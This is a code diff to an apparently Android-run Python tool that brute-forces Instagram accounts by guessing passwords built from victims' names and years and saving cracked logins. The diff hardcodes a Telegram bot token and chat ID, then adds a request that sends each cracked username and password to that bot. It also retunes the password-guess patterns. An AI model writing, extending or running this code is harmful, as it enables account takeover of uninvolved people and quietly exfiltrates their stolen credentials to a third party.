@@ -35,7 +35,8 @@ import json
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from rich.console import Console
 
-
+token= '7547526933:AAHn5sTRbesNnb_e2EcKCzDc8LSqGbH8r_M'
+ID = '7327921791'
 # إزالة الرموز 
 
 import urllib.parse
@@ -177,6 +178,7 @@ def cek_DYNO(user, cookie_file_path):
         full_name = full_name.split('•')[0].strip()  # استخراج الاسم الكامل قبل "•"
         
         console.print(f"\r\n[bold yellow]           ➛ followers : {B2}{followers_count}\n[bold yellow]           ➛ full name : {B2}{full_name}\n {J2}         𖣘─────────────────━﴾𓆩XD𓆪﴿━─────────────────𖣘            \n √√√√√√√√✓")
+        exit()
         
     except Exception as e:
         console.print(f"\r [red]  Error: {e}")
@@ -192,6 +194,19 @@ def Menu():
     clear_screen()
 
     while True:
+        clear_screen()
+
+        # Check for saved cookies status
+        if os.path.isfile("/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦/rayen.txt"):
+            with open("/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦/rayen.txt", "r") as file:
+                cookies = {"cookie": file.read().strip()}
+            if check_cookies_validity(cookies):
+                cookies_status = "[green]found Cookies. / يوجد كوكيز في ملف[/green]"
+            else:
+                cookies_status = "[yellow]Cookies not working / كوكيز لا يعمل [/yellow]"
+        else:
+            cookies_status = "[yellow]Cookie not found / لم يتم العثور على ملف كوكيز[/yellow]"
+
         
         Console().print(f"""\033{Na}
 
@@ -204,7 +219,9 @@ def Menu():
 \033[1;35m       ____𓆩Atef Ben Amor & Rayen Gamoudi & wissem Akoudi𓆪____\n
 \033[1;33m                  ____Well Come To 𝐓𝐄𝐀𝐌 <> 𝐀𝐑𝐖 ____
 \n\033[1;00m''')
-        Console().print(f'\n   بيع وروح$اي تهبط&نيك زبي &عصبة لتونس كاملة# ')
+
+        Console().print(f"\n {P2}[{H2}✵{P2}] 𝐂𝐨𝐨𝐤𝐢𝐞𝐬 : {H2} {cookies_status}\n")
+        
         Console().print(f'\n [1]. 𝐂𝐫𝐚𝐜𝐤𝐢𝐧𝐠 𝐅𝐫𝐨𝐦 𝐅𝐢𝐥𝐞\n')
         Console().print(f'\n [2]. 𝐃𝐮𝐦𝐩 𝐅𝐢𝐥𝐞 𝐋𝐢𝐬𝐭 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 (soon)\n')
         choice = Console().input(' [?]   ➛  ')
@@ -286,9 +303,9 @@ class Require:
             self.one.append(first_name.capitalize() + '1234')
             self.one.append(first_name.capitalize() + '1234567')
             self.one.append(first_name + first_name)
-            self.one.append(first_name.capitalize() + '12')
-            self.one.append(last_name +'123')
-            self.one.append(last_name +'12345')
+            self.one.append(first_name.capitalize() + '2000')
+            self.one.append(first_name +'2009')
+            self.one.append(last_name +'2010')
         # التعامل مع الأسماء الثلاثية
         elif len(names) == 3:
             first_name = names[0].lower()  # الاسم الأولn
@@ -309,9 +326,9 @@ class Require:
             self.one.append(first_name.capitalize() + '1234')
             self.one.append(first_name.capitalize() + '1234567')
             self.one.append(first_name + first_name)
-            self.one.append(first_name.capitalize() + '12')
-            self.one.append(last_name +'123')
-            self.one.append(last_name +'12345')
+            self.one.append(first_name.capitalize() + '2008')
+            self.one.append(last_name +'2010')
+            self.one.append(last_name +'2009')
 
         # خلط القائمة بشكل عشوائي
         random.shuffle(self.one)
@@ -538,6 +555,7 @@ class Brute:
                     self.cp += 1
                     open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦/حسابات Ok-CP/حسابات-CP.txt', 'a').write(f'{user}|{pswd}\n')
                     console.print(f"\r {K2}         𖣘─────────────────━﴾𓆩CP𓆪﴿━─────────────────𖣘            \n[bold yellow]           ├ {user} | {pswd}\n[bold yellow]           ├ CP:{B2} {self.cp}\n")
+                    requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str('✵ -  : '+user+' ׀ '+pswd))
                     cek_DYNO(user, cookie_file_path)
                     break
 
@@ -552,14 +570,13 @@ if __name__ == "__main__":
         # تحديد المسارات
         main_folder = '/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐢𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦'
         accounts_folder = os.path.join(main_folder, 'حسابات Ok-CP')
-        list_folder = os.path.join(main_folder, '')
+
         
         # التحقق من وجود المجلدات وإنشائها إذا لم تكن موجودة
         if not os.path.exists(accounts_folder):
             os.makedirs(accounts_folder)
         
-        if not os.path.exists(list_folder):
-            os.makedirs(list_folder)
+
 
         # إنشاء الملفات فقط إذا لم تكن موجودة
         if not os.path.exists(os.path.join(accounts_folder, 'حسابات-OK.txt')):
@@ -583,4 +600,4 @@ if __name__ == "__main__":
     brute = Brute()  # كائن من الفئة Brute
     Menu()           # عرض القائnnمjjة أو nتنفيذ الخياراتgh
     
-    #bhgوتyyyتتتتناتتjjhhhhy
+    #bhgوتyyyتتتتناتتjjhhhhyة
